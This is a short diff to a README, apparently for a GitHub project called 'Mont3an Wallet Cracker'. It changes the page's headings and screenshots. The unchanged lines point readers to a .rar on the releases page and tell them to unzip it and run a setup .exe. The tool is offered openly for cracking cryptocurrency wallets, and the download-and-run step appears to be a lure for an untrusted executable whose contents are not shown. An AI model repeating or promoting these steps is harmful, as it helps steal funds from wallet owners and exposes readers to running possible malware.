@@ -6,8 +6,9 @@
  <h2 align="center">Screenshot</h2>
 <p align="center">
   <img src="screenshot.png" alt="screenshot" />
+   <img src="2.png" alt="screenshot" />
 </p>
-## How To Use
+ <h2 align="center">How to use</h2>
 
 Go to the releases  or <a href="https://github.com/M0nTan3/Mont3an-Wallet-Cracker/releases/mont3an wallet cracker setup.rar" target="_blank">click here</a>
 Unzip and run mont3an wallet cracker setup.exe
